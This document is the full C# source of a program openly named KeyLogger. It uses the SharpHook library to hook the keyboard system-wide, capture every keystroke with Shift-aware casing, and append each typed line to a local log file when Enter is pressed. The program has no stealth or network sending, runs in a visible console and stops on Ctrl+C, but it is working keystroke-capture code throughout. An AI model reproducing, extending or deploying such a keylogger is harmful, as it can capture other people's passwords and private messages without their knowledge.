using System;
using SharpHook;
using SharpHook.Reactive;

namespace KeyLogger
{
    class Program
    {
        private static string exePath = Environment.CurrentDirectory;
        private static string logFolder = Path.Join(exePath, "KLogs");
        private static string logFile = Path.Join(logFolder, "Log.klog");
        private static string recorded = "";
        private static bool _cancelled = false;
        private static bool isShiftDown = false;
        public static void Main(string[] args)
        {
            Console.CancelKeyPress += new ConsoleCancelEventHandler(Console_CancelKeyPress);
            if(!Directory.Exists(logFolder))
            {
                Directory.CreateDirectory(logFolder);
            }
            if(!File.Exists(logFile))
            {
                var file = File.Create(logFile);
                file.Close();
            }
            var hook = new SimpleReactiveGlobalHook();
            hook.KeyPressed.Subscribe(KeyPressed);
            hook.KeyReleased.Subscribe(KeyReleased);
            hook.RunAsync();
            while(!_cancelled)
            {

            }
            hook.Dispose();
            
        }

        private static void KeyReleased(KeyboardHookEventArgs key)
        {
            string releasedKey = key.Data.KeyCode.ToString();
            releasedKey = releasedKey.Remove(0,2);
            if(isShiftDown && releasedKey.Contains("Shift"))
            {
                isShiftDown = false;
            }
        }

        private static void KeyPressed(KeyboardHookEventArgs key)
        {
            string keyPressed = key.Data.KeyCode.ToString();
            keyPressed = keyPressed.Remove(0,2);
            if(keyPressed.Contains("Shift"))
            {
                isShiftDown = true;
                return;
            }
            if(keyPressed == "Space")
            {
                keyPressed = " ";
            }
            Console.WriteLine(keyPressed);
            if(keyPressed == "Enter")
            {
                SaveFile();
            }else 
            {
                if(keyPressed.Length > 1)
                {
                    keyPressed = " (" + keyPressed + ") ";
                }
                if(!isShiftDown)
                {
                    recorded += keyPressed.ToLower();

                }else
                {
                    recorded += keyPressed;
                }
            }
        }
        private static void SaveFile()
        {
            Console.WriteLine(recorded);
            string[] prevLog = File.ReadAllLines(logFile);
            List<string> newLog = new List<string>();
            foreach(string data in prevLog)
            {
                newLog.Add(data);
            }
            newLog.Add(recorded);
            File.WriteAllLines(logFile, newLog);
            recorded = "";
        }
        private static void Console_CancelKeyPress(object sender, ConsoleCancelEventArgs e)
    {
        //Console.WriteLine("Cancelling");
        if (e.SpecialKey == ConsoleSpecialKey.ControlC)
        {
            _cancelled = true;
            e.Cancel = true;
        }
    }
    }
}